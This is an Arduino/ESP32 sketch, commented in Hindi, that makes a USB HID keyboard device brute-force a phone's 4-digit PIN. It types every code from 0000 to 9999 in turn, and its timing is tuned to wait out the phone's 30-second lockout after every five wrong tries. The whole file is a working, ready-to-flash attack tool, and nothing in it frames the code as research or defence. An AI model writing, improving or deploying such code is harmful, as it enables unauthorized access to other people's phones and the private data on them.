#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

const int BOOT_BUTTON_PIN = 0; 

int currentPin = 0;
int attemptCount = 0;
bool isRunning = false;

void setup() {
  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  Keyboard.begin();
  USB.begin();
}

void loop() {
  // बूट बटन दबाने का इंतज़ार
  if (!isRunning) {
    if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
      delay(50); 
      if (digitalRead(BOOT_BUTTON_PIN) == LOW) {
        delay(5000); // फोन पर कर्सर सेट करने के लिए 5 सेकंड का समय
        isRunning = true; 
      }
    }
    return; 
  }

  // यहाँ [5] का होना ज़रूरी है ताकि मेमोरी क्रैश न हो
  char pinString[5];
  sprintf(pinString, "%04d", currentPin);

  // एक-एक करके 4 डिजिट टाइप करना और उनके बीच 15ms का गैप रखना
  for (int i = 0; i < 4; i++) {
    char digit[2] = {pinString[i], '\0'};
    Keyboard.print(digit);
    delay(15); // एक अंक से दूसरे अंक के बीच 15ms का गैप
  }
  
  // (नोट: यहाँ Enter की नहीं दबाई जा रही है, फोन ऑटो-सबमिट कर लेगा)

  currentPin++;
  if (currentPin > 9999) {
    currentPin = 0; 
  }

  // 4 डिजिट टाइप होने के बाद फोन द्वारा गलत पिन रिजेक्ट करने और बॉक्स खाली करने के लिए समय
  delay(300); 

  attemptCount++;

  // हर 5 बार ट्राई करने के बाद 32 सेकंड का सुरक्षित गैप
  if (attemptCount >= 5) {
    attemptCount = 0; 
    delay(32000); // 30 सेकंड के लॉक से पूरी तरह बाहर आने के लिए 32 सेकंड बेस्ट है
  }
}
